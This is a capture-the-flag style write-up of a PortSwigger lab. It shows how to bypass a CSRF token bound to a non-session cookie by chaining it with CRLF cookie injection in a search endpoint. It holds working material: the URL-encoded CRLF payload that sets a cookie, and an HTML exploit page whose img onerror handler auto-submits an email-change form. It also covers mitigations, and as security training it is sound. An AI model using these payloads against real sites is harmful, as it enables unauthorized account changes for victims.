# 📘 PortSwigger Lab: CSRF where token is tied to non-session cookie

<a id="top"></a>

🔗 **Official Lab:** https://portswigger.net/web-security/learning-paths/csrf/csrf-common-flaws-in-csrf-token-validation/csrf/bypassing-token-validation/lab-csrf-token-tied-to-non-session-cookie  
🎯 **Topic:** CSRF — token bound to a non-session cookie (csrfKey) + CRLF cookie injection  
🧪 **Difficulty:** Practitioner  
✅ **Status:** Solved  
🛠 **Tools:** Burp Suite (Proxy, Repeater), Exploit Server, two browser sessions  
🔑 **Credentials:** `wiener:peter` / `carlos:montoya`

---

## 📑 Contents
- [📘 PortSwigger Lab: CSRF where token is tied to non-session cookie](#-portswigger-lab-csrf-where-token-is-tied-to-non-session-cookie)
  - [📑 Contents](#-contents)
  - [🎯 Goal](#-goal)
  - [🧠 Short Theory](#-short-theory)
  - [🧩 Core Idea](#-core-idea)
  - [🗺 Attack Scheme](#-attack-scheme)
  - [🔍 Step 1 — Analyze Legitimate Request](#-step-1--analyze-legitimate-request)
  - [🔍 Step 2 — Test Session vs csrfKey](#-step-2--test-session-vs-csrfkey)
  - [🔍 Step 3 — Test Token Across Accounts](#-step-3--test-token-across-accounts)
  - [🔍 Step 4 — Find Cookie Injection Point](#-step-4--find-cookie-injection-point)
  - [🔍 Step 5 — Build CSRF Exploit with Cookie Injection](#-step-5--build-csrf-exploit-with-cookie-injection)
  - [🔍 Step 6 — Test Exploit on Yourself](#-step-6--test-exploit-on-yourself)
  - [🔍 Step 7 — Deliver Exploit to Victim](#-step-7--deliver-exploit-to-victim)
  - [📨 Example Requests](#-example-requests)
  - [📥 Example Result](#-example-result)
  - [🧾 Complete Attack Chain](#-complete-attack-chain)
  - [🔬 Why the Attack Worked](#-why-the-attack-worked)
  - [🧠 Pentester Mindset](#-pentester-mindset)
  - [❌ Common Mistakes](#-common-mistakes)
  - [🛡 Mitigation](#-mitigation)
  - [✅ Checklist](#-checklist)
  - [🧾 Conclusion](#-conclusion)

---

<a id="goal"></a>
## 🎯 Goal
The email change functionality is protected by a CSRF token, but the token is **not fully integrated into the site's session handling system** — it is bound to a separate `csrfKey` cookie rather than to the session. The task:

1. Use the exploit server to host an HTML page that performs a CSRF attack.
2. Change the victim's email address via CSRF.

Two accounts are provided to help design the attack: `wiener:peter` and `carlos:montoya`.

*Hint: you cannot register an email address already taken by another user. If you change your own email while testing, use a different address in the final exploit.*

<a id="theory"></a>
## 🧠 Short Theory
CSRF (Cross-Site Request Forgery) is an attack where the attacker forces the victim's browser to perform an unwanted action on a vulnerable site where the victim is authenticated.

A CSRF token is only effective when it is **bound to the victim's session**. A common flawed design binds the token to a **separate cookie** (`csrfKey`) instead of the session. Since both the token and the key travel together in the attacker's own browser, the pair is interchangeable between users. Worse, if any endpoint reflects user input into the `Set-Cookie` header (CRLF injection), the attacker can **inject their own csrfKey cookie into the victim's browser** — forcing the victim to use the attacker's key/token pair, which the server then validates successfully.

<a id="idea"></a>
## 🧩 Core Idea
Combine two flaws:

- The `csrfKey` cookie + `csrf` token pair is **not tied to the session** — the attacker's own pair works in the victim's session.
- The search endpoint reflects input into `Set-Cookie` (CRLF injection) — the attacker can set the victim's `csrfKey` cookie cross-origin.

**The chain:** the exploit page first injects the attacker's `csrfKey` into the victim's browser via an `<img>` tag hitting the vulnerable search endpoint, then submits the email-change form with the attacker's matching `csrf` token. The victim's session + attacker's key + attacker's token = a valid request.

<a id="attack-scheme"></a>
## 🗺 Attack Scheme
1. **Recon:** Intercept `POST /my-account/change-email` from wiener; note `csrfKey` cookie and `csrf` parameter.
2. **Test:** Changing `session` → logged out; changing `csrfKey` → token merely rejected (not session-bound).
3. **Verify:** carlos's session + wiener's `csrfKey` + `csrf` pair → accepted → pair is portable.
4. **Injection point:** Search term is reflected into `Set-Cookie` → CRLF cookie injection.
5. **Exploit:** Inject attacker's `csrfKey` via `<img>` (CRLF), then auto-submit form with matching `csrf` token.
6. **Test:** View exploit on yourself → email changed.
7. **Deliver:** Deliver to victim → lab solved.

<a id="step1"></a>
## 🔍 Step 1 — Analyze Legitimate Request
Logged in as `wiener:peter` in Burp's browser, submitted the "Update email" form, and found the request in Proxy history. Sent it to Repeater.

Noted the request now carries **two security artifacts**: the `session` cookie and a separate `csrfKey` cookie, plus the `csrf` parameter in the body.

```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER; csrfKey=CSRFKEY_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_WIENER
```

<a id="step2"></a>
## 🔍 Step 2 — Test Session vs csrfKey
In Repeater:

- Changed the `session` cookie → **logged out** (session is strictly validated).
- Changed the `csrfKey` cookie → request rejected with "Invalid CSRF token" — but **not logged out**.

*Conclusion: the csrfKey is not part of the session; it lives in its own cookie with its own validation path.*

<a id="step3"></a>
## 🔍 Step 3 — Test Token Across Accounts
Opened an incognito window, logged in as `carlos:montoya`, sent a fresh update-email request into Repeater.

Swapped **both** the `csrfKey` cookie **and** the `csrf` parameter from wiener's request into carlos's request:

```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_CARLOS; csrfKey=CSRFKEY_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_WIENER
```

**Result:** the request was **accepted** — carlos's session worked with wiener's csrfKey/csrf pair.

*Conclusion: the key/token pair is not tied to the user — it is portable between accounts.*

<a id="step4"></a>
## 🔍 Step 4 — Find Cookie Injection Point
Closed the Repeater/incognito session. Back in the original browser, performed a **search** on the site and sent the request to Repeater.

Observed that the search term is **reflected in the `Set-Cookie` response header** (e.g. `Set-Cookie: search=test; ...`). The search function has **no CSRF protection**, so any origin can trigger it and plant a cookie in the victim's browser.

PoC injection URL (URL-encoded CRLF `%0d%0a`):

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=CSRFKEY_WIENER%3b%20SameSite=None
```

- `%0d%0a` — CRLF, breaking out of the reflected value into a new header.
- `SameSite=None` — mandatory, so the browser sends the cookie on cross-site requests.

<a id="step5"></a>
## 🔍 Step 5 — Build CSRF Exploit with Cookie Injection
Created the exploit from the email-change request, including wiener's `csrf` token, then **removed the auto-submit `<script>` block** and replaced it with an `<img>` that first injects the cookie and submits the form in its `onerror` handler:

```html
<form method="POST" action="https://LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="csrf" value="CSRF_TOKEN_WIENER">
    <input type="hidden" name="email" value="attacker@web-security-academy.net">
</form>
<img src="https://LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=CSRFKEY_WIENER%3b%20SameSite=None" onerror="document.forms[0].submit()">
```

**How it works:**
1. The `<img>` triggers a GET to the vulnerable search endpoint → the response contains `Set-Cookie: csrfKey=CSRFKEY_WIENER; SameSite=None` → the victim's browser now holds the attacker's key.
2. The image fails to render (it's not a valid image) → `onerror` fires → the form is submitted with the matching `csrf` token.
3. The victim's session + the injected csrfKey + the attacker's token → the server accepts the request.

<a id="step6"></a>
## 🔍 Step 6 — Test Exploit on Yourself
Pasted the HTML into the exploit server "Body" field, stored it, and clicked "View exploit". Confirmed the email was changed.

⚠️ Per the hint: emails must be unique — use a **different** email address in the final exploit than the one used during testing (e.g. change it to another new address).

<a id="step7"></a>
## 🔍 Step 7 — Deliver Exploit to Victim
Updated the email in the exploit to a fresh unused address, stored it, and clicked "Deliver to victim". The victim's email was changed → lab solved.

<a id="requests"></a>
## 📨 Example Requests
**Legitimate request from wiener**
```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_WIENER; csrfKey=CSRFKEY_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_WIENER
```

**Cross-account test: carlos session + wiener's key/token pair**
```http
POST /my-account/change-email HTTP/2
Host: LAB-ID.web-security-academy.net
Cookie: session=SESSION_CARLOS; csrfKey=CSRFKEY_WIENER
Content-Type: application/x-www-form-urlencoded

email=test@test.com&csrf=CSRF_TOKEN_WIENER
```

**Cookie injection via search endpoint**
```http
GET /?search=test%0d%0aSet-Cookie:%20csrfKey=CSRFKEY_WIENER%3b%20SameSite=None HTTP/2
Host: LAB-ID.web-security-academy.net
```

<a id="response"></a>
## 📥 Example Result
**Cross-Account Pair Test**
- carlos session + wiener's csrfKey + wiener's csrf → 302 Redirect (success)  
→ The key/token pair is portable between users

**Cookie Injection Check**
- `GET /?search=test%0d%0aSet-Cookie: csrfKey=...` → response contains `Set-Cookie: csrfKey=...; SameSite=None`  
→ CRLF injection works, cookie is plantable cross-origin

**Exploit**
- Victim's session + injected csrfKey + attacker's csrf → 302 Redirect (success)  
→ Email changed

<a id="attack-chain"></a>
## 🧾 Complete Attack Chain
1. Login as wiener → intercept `POST /my-account/change-email` → note csrfKey cookie + csrf token.
2. Repeater: change session → logged out; change csrfKey → merely token rejection.
3. Incognito: carlos + wiener's pair → accepted → pair is portable.
4. Search endpoint → reflected into `Set-Cookie` → CRLF cookie injection.
5. Exploit: `<img>` injects csrfKey (SameSite=None), `onerror` submits form with matching csrf token.
6. View exploit → test on yourself → email changed.
7. Fresh email address in exploit → Deliver to victim → **Solved**.

<a id="breakdown"></a>
## 🔬 Why the Attack Worked
- **Token bound to the wrong thing:** the CSRF token is paired with a separate `csrfKey` cookie, not with the session — the pair can be moved between users.
- **Attacker is also a user:** the site issues a genuine key/token pair to the attacker's own account.
- **CRLF injection in Set-Cookie:** the search endpoint reflects input into the `Set-Cookie` header, letting the attacker set cookies in the victim's browser cross-origin.
- **SameSite=None:** without this attribute the injected cookie would not be sent on the cross-site POST; the injection explicitly sets it.
- **Chained primitives:** cookie injection (GET, no CSRF protection) + form auto-submit (POST) = full CSRF bypass.

<a id="pentester"></a>
## 🧠 Pentester Mindset
1. **Ask what the token is bound to:** session, separate cookie, or nothing — test each artifact separately.
2. **Test portability across your own accounts:** if account A's key/token works for account B, the pair is not session-bound.
3. **Look for cookie injection points:** reflected `Set-Cookie` headers (CRLF) turn "portable pair" into a full exploit.
4. **Remember SameSite:** injected cookies need `SameSite=None` to be sent on cross-site requests.
5. **Chain primitives:** a seemingly harmless reflection (search field) can be the missing link of the exploit.

<a id="mistakes"></a>
## ❌ Common Mistakes
- **Swapping only the csrf parameter:** the token alone is rejected — the `csrfKey` cookie must be swapped **together** with the `csrf` parameter.
- **Forgetting SameSite=None in the injection:** without it the browser won't send the injected cookie on the cross-site POST.
- **Leaving the auto-submit `<script>`:** the script fires before the `<img>` finishes setting the cookie — remove it and submit from `onerror`.
- **Using the same email in test and final exploit:** emails are unique; the final exploit needs a different address.
- **URL-encoding errors:** `%0d%0a` for CRLF, `%3b` for `;`, `%20` for spaces — unencoded characters break the header injection.
- **Burning the token pair:** regenerate by loading your account page fresh if requests start failing.

<a id="defense"></a>
## 🛡 Mitigation
- **Tie the CSRF token to the session** — validate the (session, token) pair server-side; no separate csrfKey cookie.
- Use framework-level CSRF protection bound to session state.
- **Eliminate CRLF injection** — sanitize/refuse CR/LF in any input reflected into response headers; modern frameworks reject header injection by default.
- **SameSite cookies** (Lax/Strict) for the session cookie as defense in depth.
- Check **Origin/Referer** headers for state-changing requests.

<a id="checklist"></a>
## ✅ Checklist
- [ ] Captured csrfKey cookie + csrf token from wiener's request
- [ ] Confirmed: session change → logout; csrfKey change → token rejection only
- [ ] Confirmed: carlos session + wiener's pair → accepted
- [ ] Search endpoint reflects into Set-Cookie (CRLF injection)
- [ ] Built exploit: `<img>` cookie injection + form with csrf token, submit via `onerror`
- [ ] SameSite=None included in the injected cookie
- [ ] View exploit → tested on yourself → email changed
- [ ] Fresh, non-matching email in the final exploit
- [ ] Deliver to victim → lab solved
- [ ] Status: **Solved**

<a id="conclusion"></a>
## 🧾 Conclusion
The lab demonstrates that a CSRF token is only a defense when it is bound to the victim's **session**. Binding it to a separate cookie creates a portable key/token pair, and a CRLF injection in a unprotected search endpoint lets the attacker plant their own pair into the victim's browser. The key lesson: analyze what the security artifact is actually tied to, and treat any header reflection as a potential cookie-injection primitive — combined, two minor flaws become a full authentication-bound CSRF bypass.

⬆ [Back to top](#top)